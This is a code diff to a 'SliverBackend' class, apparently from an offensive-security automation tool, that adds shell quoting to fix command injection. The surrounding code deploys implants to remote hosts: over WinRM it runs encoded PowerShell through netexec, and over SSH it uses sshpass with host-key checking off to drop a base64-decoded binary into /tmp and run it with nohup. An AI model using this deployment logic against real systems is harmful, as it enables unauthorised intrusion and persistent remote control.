@@ -1,5 +1,6 @@
 import asyncio
 import os
+import shlex
 import subprocess
 import tempfile
 import time
@@ -180,9 +181,9 @@ class SliverBackend:
             )
             from ..kali_tools_client import kali
             result = await kali.run("netexec", (
-                f"winrm {target} "
-                f"-u '{username}' -p '{password}' "
-                f"-X 'powershell -EncodedCommand {base64.b64encode(ps_cmd.encode()).decode()}'"
+                f"winrm {shlex.quote(target)} "
+                f"-u {shlex.quote(username)} -p {shlex.quote(password)} "
+                f"-X {shlex.quote('powershell -EncodedCommand ' + base64.b64encode(ps_cmd.encode()).decode())}"
             ), timeout=120)
             if "error" not in result:
                 return remote_path
@@ -204,11 +205,11 @@ class SliverBackend:
             remote_path = f"/tmp/{uuid.uuid4().hex[:8]}"
             from ..kali_tools_client import kali
             deploy_cmd = (
-                f"sshpass -p '{password_or_key}' ssh -o StrictHostKeyChecking=no "
-                f"{username}@{target} "
-                f"'base64 -d > {remote_path} <<< {b64} && chmod +x {remote_path} && nohup {remote_path} >/dev/null 2>&1 &'"
+                f"sshpass -p {shlex.quote(password_or_key)} ssh -o StrictHostKeyChecking=no "
+                f"{shlex.quote(username)}@{shlex.quote(target)} "
+                f"{shlex.quote(f'base64 -d > {remote_path} <<< {b64} && chmod +x {remote_path} && nohup {remote_path} >/dev/null 2>&1 &')}"
             )
-            result = await kali.run("bash", f"-c '{deploy_cmd}'", timeout=120)
+            result = await kali.run("bash", f"-c {shlex.quote(deploy_cmd)}", timeout=120)
             if "error" not in result:
                 return remote_path
         except Exception:
